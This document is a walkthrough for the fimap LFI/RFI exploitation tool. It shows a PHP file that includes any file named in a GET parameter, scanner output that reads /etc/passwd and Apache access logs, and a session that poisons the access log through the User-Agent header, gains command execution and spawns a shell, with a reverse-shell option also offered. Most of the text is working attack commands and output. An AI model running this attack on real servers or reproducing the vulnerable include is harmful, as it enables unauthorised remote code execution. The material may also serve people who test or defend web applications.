# fimap Logfile Injection Introdution #

## 0. Example PHP Code ##
```
<? include($_GET["inc"]); ?>
```

## 1. fimap result for it ##
```
imax@DevelB0x:/var/www$ fimap -u http://localhost/vuln.php?inc=index.php
fimap v.05_svn by Iman Karim - Automatic LFI/RFI scanner and exploiter.
SingleScan is testing URL: 'http://localhost/vuln.php?inc=index.php'
[OUT] Parsing URL 'http://localhost/vuln.php?inc=index.php'...
[INFO] Fiddling around with URL...
[OUT] Possible file inclusion found! -> 'http://localhost/vuln.php?inc=kg2Gq9Cw' with Parameter 'inc'.
[OUT] Identifing Vulnerability 'http://localhost/vuln.php?inc=index.php' with Param 'inc'...
[INFO] Scriptpath received: '/var/www'
[INFO] Testing file '/etc/passwd'...
[INFO] Testing file '/proc/self/environ'...
[INFO] Testing file 'php://input'...
[INFO] Testing file '/var/log/apache2/access.log'...
[INFO] Testing file '/var/log/apache/access.log'...
[INFO] Testing file '/var/log/httpd/access.log'...
[INFO] Testing file '/var/log/http/access.log'...
[INFO] Testing file 'http://www.phpbb.de/index.php'...
[INFO] Testing file 'http://www.uni-bonn.de/Frauengeschichte/index.html'...
[INFO] Testing file 'http://www.kah-bonn.de/index.htm?presse/winterthur.htm'...
##########################################################
#[1] Possible File Injection                             #
##########################################################
#  [URL]      http://localhost/vuln.php?inc=index.php    #
#  [PARAM]    inc                                        #
#  [PATH]     /var/www                                   #
#  [TYPE]     Absolute Clean                             #
#  [NULLBYTE] No Need. It's clean.                       #
#  [READABLE FILES]                                      #
#                   [0] /etc/passwd                      #
#                   [1] /var/log/apache2/access.log      #
##########################################################
```

## 2. Exploiting It ##
```
imax@DevelB0x:~$ fimap -x
fimap v.05_svn by Iman Karim - Automatic LFI/RFI scanner and exploiter.
################################                                       
#:: List of Domains ::         #                                       
################################                                       
#[1] 10.8.0.7                  #                                       
#[2] 10.8.0.10                 #                                       
#[3] 10.8.0.13                 #                                       
#[4] 10.8.0.15                 #                                       
#[5] localhost                 #
#[q] Quit                      #
################################
Choose Domain: 5
#########################################################################################################
#:: FI Bugs on 'localhost' ::                                                                           #
#########################################################################################################
#[1] URL: '/vuln.php?inc=index.php' injecting file: '/var/log/apache2/access.log' using param: 'inc'    #
#[q] Quit                                                                                               #
#########################################################################################################
Choose vulnerable script: 1
[INFO] Testing php-code injection thru Logfile HTTP-UA-Injection...  # LOG INJECTION HERE
[INFO] Testing if log kickstarter is present...
[INFO] Kickstarter is not present. Injecting kickstarter...          # KICKSTART NOT FOUND!
[INFO] Testing once again if kickstarter is present...
[INFO] Kickstarter successfully injected!                            # ALL COOL!
[OUT] PHP Injection works! Testing if execution works...
[INFO] Testing execution thru 'popen'...
[INFO] Execution thru 'popen' works!
####################################################
#:: Available Attacks - PHP and SHELL access ::    #
####################################################
#[1] Spawn fimap shell                             #
#[2] Spawn reverse shell                           #
#[q] Quit                                          #
####################################################
Choose Attack: 1
Please wait - Setting up shell (one request)...
-------------------------------------------
Welcome to fimap shell!
Better dont start interactive commands!  ;)
Enter 'q' to exit the shell.
-------------------------------------------
fimap_shell:/var/www$> uname -a
Linux DevelB0x 2.6.28-11-generic #42-Ubuntu SMP Fri Apr 17 01:57:59 UTC 2009 i686 GNU/Linux
fimap_shell:/var/www$> pwd
/var/www
fimap_shell:/var/www$> q
See ya dude!
imax@DevelB0x:~$
```